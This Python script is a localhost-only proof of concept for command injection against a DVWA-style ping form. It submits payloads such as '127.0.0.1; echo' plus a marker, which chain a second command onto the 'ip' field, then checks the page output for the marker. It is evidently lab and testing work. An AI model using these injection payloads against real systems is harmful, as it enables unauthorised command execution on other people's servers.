#!/usr/bin/env python3
"""CMD-001 local-only PoC draft (command injection, benign echo marker).

Only 127.0.0.1 / localhost / ::1 are accepted. It sends a normal ping
baseline, then benign echo markers, and parses the <pre> command-output
region. No reverse shell, no file read/write, no persistence.
"""
import argparse
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
MARKER = "CMDINJ_MARKER_7f3a"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_target(base_url):
    parsed = urllib.parse.urlsplit(base_url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("refused: only http/https is allowed")
    if (parsed.hostname or "") not in ALLOWED_HOSTS:
        raise SystemExit("refused non-local host: %s" % parsed.hostname)
    return parsed


def load_cookie_header(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as fh:
        value = fh.read().strip()
    return value or None


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def request(opener, url, cookie_header, timeout, data=None):
    body = urllib.parse.urlencode(data).encode("utf-8") if data else None
    req = urllib.request.Request(url, data=body, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie_header:
        req.add_header("Cookie", cookie_header)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def fetch_token(opener, page_url, cookie_header, timeout, field):
    if not field:
        return None
    status, html = request(opener, page_url, cookie_header, timeout)
    pattern = r'name=["\']%s["\'][^>]*value=["\']([^"\']+)["\']' % re.escape(field)
    match = re.search(pattern, html, re.IGNORECASE)
    return match.group(1) if match else None


PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.IGNORECASE | re.DOTALL)


def extract_pre(html):
    """Return text inside the first <pre> block (the ping output region)."""
    match = PRE_RE.search(html)
    if not match:
        return ""
    text = re.sub(r"<[^>]+>", "", match.group(1))
    return (text.replace("&lt;", "<").replace("&gt;", ">")
                .replace("&quot;", '"').replace("&amp;", "&"))


def main():
    parser = argparse.ArgumentParser(description="CMD-001 benign command-injection PoC draft")
    parser.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1/dvwa")
    parser.add_argument("--path", default="/vulnerabilities/exec/", help="page path containing the form")
    parser.add_argument("--cookie-file", default=None, help="local file holding the Cookie header")
    parser.add_argument("--os", choices=["windows", "nix"], required=True,
                        help="pick the branch matching php_uname on the target")
    parser.add_argument("--token-field", default=None,
                        help="hidden token field name if the deployment enables CSRF tokens")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    check_target(args.base_url)
    cookie_header = load_cookie_header(args.cookie_file)
    page_url = args.base_url.rstrip("/") + "/" + args.path.lstrip("/")
    opener = make_opener()

    if args.os == "windows":
        payloads = ["127.0.0.1 & echo " + MARKER, "127.0.0.1 | echo " + MARKER]
    else:
        payloads = ["127.0.0.1; echo " + MARKER,
                    "127.0.0.1 && echo " + MARKER,
                    "127.0.0.1 | echo " + MARKER]

    def submit(ip_value):
        fields = {"Submit": "Submit", "ip": ip_value}
        if args.token_field:
            token = fetch_token(opener, page_url, cookie_header, args.timeout, args.token_field)
            if not token:
                print("precondition failure: token field %r not found; refetch in the same "
                      "session or provide a valid cookie file" % args.token_field)
                sys.exit(3)
            fields[args.token_field] = token
        status, html = request(opener, page_url, cookie_header, args.timeout, data=fields)
        pre = extract_pre(html)
        return {"ip": ip_value, "status": status, "output_region": pre,
                "marker_in_output": MARKER in pre}

    results = [submit("127.0.0.1")]
    for payload in payloads:
        results.append(submit(payload))

    print(json.dumps({"page": page_url, "os_branch": args.os, "marker": MARKER,
                      "results": results}, ensure_ascii=False, indent=2))

    triggered = any(r["marker_in_output"] for r in results[1:])
    baseline_clean = not results[0]["marker_in_output"] and bool(results[0]["output_region"])
    if triggered and baseline_clean:
        return 0
    if not baseline_clean:
        print("note: baseline <pre> output missing or already contains the marker; "
              "do not infer execution from this run")
    return 2


if __name__ == "__main__":
    sys.exit(main())
